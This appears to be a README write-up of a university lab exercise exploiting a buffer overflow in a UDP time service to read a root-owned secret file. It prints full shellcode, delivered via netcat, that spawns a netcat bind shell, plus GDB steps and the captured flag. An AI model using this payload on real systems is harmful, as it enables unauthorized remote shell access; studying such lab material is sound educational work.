# Buffer Overflow Attack on Time Service

## Overview
This project demonstrates a buffer overflow attack on a time service running on a server. The task was part of a lab exercise aimed at understanding how buffer overflows can be exploited in a controlled environment. The primary objective was to obtain a secret file (`secret.txt`) located in the `/root/` directory of the server by exploiting a buffer overflow vulnerability in the service.

## Objectives
- **Exploit a Buffer Overflow**: Understand and exploit a buffer overflow vulnerability in the time service.
- **Obtain the Secret**: Retrieve the `secret.txt` file from the server's root directory.
- **Demonstrate Exploit**: Develop and execute a custom shellcode to achieve remote code execution on the server.

## Preparation
### Tools and Knowledge
- **Assembler (`nasm`)**: Used for writing the shellcode.
- **GNU Debugger (`gdb`)**: Helpful in identifying the return address and debugging the exploit.
- **Netcat (`nc`)**: Used for communication between the attacker and the server.
- **C/C++ Compiler**: For compiling custom payloads and shellcode.

## Laboratory Setup
1. **Connecting to Chuck**:
    - SSH into the attacker machine "Chuck" using the provided credentials.
    - Enumerate and bring up the network interface.
    - Ensure connectivity to the server "Time" by pinging the server and connecting to the time service on port `2222`.

    ```bash
    ssh userXY@chuck.informatik.tu-cottbus.de
    ifconfig -a
    sudo /usr/sbin/ifconfig ethXY up
    ping -I ethXY -c3 10.10.XY.12
    nc -u 10.10.XY.12 2222
    ```

## Task Description
### Goal
- Exploit the buffer overflow vulnerability in the `timeservice` running on the server.
- Obtain the `secret.txt` file located at `/root/`.

### Steps to Exploit

1. **Identify the Vulnerability**:
    - Analyzed the `timeservice.c` code and found that passing `strlen` with a NULL byte leads to a buffer overflow vulnerability.

2. **Debugging with GDB**:
    - Used GDB to debug the `timeservice` and locate the return address. The following steps were performed:
    
    ```bash
    make -B  # Generate the timeservice binary
    ./timeservice 10.10.10.11 2222
    netstat -anp | grep time  # Find the process ID for the timeservice
    gdb -p <timeservice_pid>  # Attach GDB to the timeservice process
    ```
    - Set breakpoints in the code and observed the memory layout to locate where the return address is stored:

    ```bash
    break 37
    break 48
    break 165
    set follow-fork-mode child
    c
    c
    c
    p &timebuf
    p &format
    x/xw 0xffffdbb0
    quit
    ```

3. **Write and Execute Shellcode**:
    - Created a custom shellcode to exploit the vulnerability. The shellcode was crafted to spawn a shell that could be accessed remotely:

    ```bash
    echo -ne "\x78\x78\x78\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x6a\x17\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x6a\x30\x66\x68\x30\x38\x68\x2d\x6c\x70\x38\x89\xe0\x52\x6a\x68\x68\x69\x6e\x2f\x73\x68\x2d\x65\x2f\x62\x89\xe1\x52\x51\x50\x53\x89\xe1\x6a\x0b\x58\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcf\xb3\x04\x08" | nc -u 10.10.10.12 2222
    ```

4. **Connect to the Time Server**:
    - After injecting the shellcode, connected to the time server using Netcat:

    ```bash
    nc 10.10.10.12 8080
    ```

5. **Retrieve the Secret**:
    - Once connected to the shell on the server, navigated to the `/root/` directory and retrieved the `secret.txt` file:

    ```bash
    cat /root/secret.txt
    ```
    - The secret was successfully extracted:
    ```plaintext
    CTF-FdLSuJqpZEhVPW75vHyg3qxXu17DFFoQyqw+Xh6O
    ```

## Conclusion
This exercise successfully demonstrated a buffer overflow exploit in a controlled environment. By carefully analyzing the vulnerable service, writing custom shellcode, and debugging the service, it was possible to gain unauthorized access to the server and retrieve the secret file.

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments
This project was completed as part of a cybersecurity exercise in an educational setting.
